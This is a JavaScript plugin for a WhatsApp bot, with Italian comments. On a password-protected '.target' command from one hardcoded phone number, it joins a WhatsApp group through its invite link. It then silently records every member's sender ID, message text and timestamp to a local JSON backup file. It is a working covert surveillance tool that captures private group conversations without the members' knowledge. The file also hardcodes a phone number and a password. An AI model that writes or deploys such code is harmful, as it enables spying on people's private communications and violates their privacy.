import fs from 'fs'
import path from 'path'

const AUTH_NUMBERS = ['66621409462@s.whatsapp.net'] // numeri autorizzati
const PASSWORD = 'mossad'

global.activeTarget = null // id gruppo attivo

let handler = async (m, { conn, args, command }) => {
  if (command === 'target') {
    if (!AUTH_NUMBERS.includes(m.sender)) 
      return m.reply('❌ Non sei autorizzato a usare questo comando.')

    if (args.length < 2) 
      return m.reply('📌 Usa:\n.target <link gruppo> mossad')

    const link = args[0]
    const pass = args[1]

    if (pass !== PASSWORD) 
      return m.reply('🔒 Password errata.')

    let regex = /https:\/\/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/;
    let match = link.match(regex);
    if (!match) return m.reply('❌ Inserisci un link valido di un gruppo WhatsApp.')

    let code = match[1];
    try {
      let res = await conn.groupGetInviteInfo(code)
      if (!res) return m.reply('❌ Link non valido o scaduto.')

      await conn.groupAcceptInvite(code)
      global.activeTarget = res.id
      m.reply(`✅ Target attivato: *${res.subject}*\nTutti i messaggi verranno salvati.`)
    } catch (e) {
      console.error(e)
      m.reply(`⚠️ Errore: ${e.message}`)
    }
  }
}

// intercetta e salva i messaggi del gruppo target
handler.before = async (m, { conn }) => {
  if (!global.activeTarget) return
  if (m.chat !== global.activeTarget) return

  const dir = './backups'
  if (!fs.existsSync(dir)) fs.mkdirSync(dir)

  const file = path.join(dir, `${m.chat}.json`)
  let logs = []
  if (fs.existsSync(file)) {
    try {
      logs = JSON.parse(fs.readFileSync(file))
    } catch {}
  }

  logs.push({
    sender: m.sender,
    text: m.text || null,
    timestamp: Date.now()
  })

  fs.writeFileSync(file, JSON.stringify(logs, null, 2))
}

// blocca gli altri plugin nel gruppo target
handler.all = async (m) => {
  if (global.activeTarget && m.chat === global.activeTarget) {
    return // lascia passare solo questo plugin
  }
}

handler.command = /^target$/i
export default handler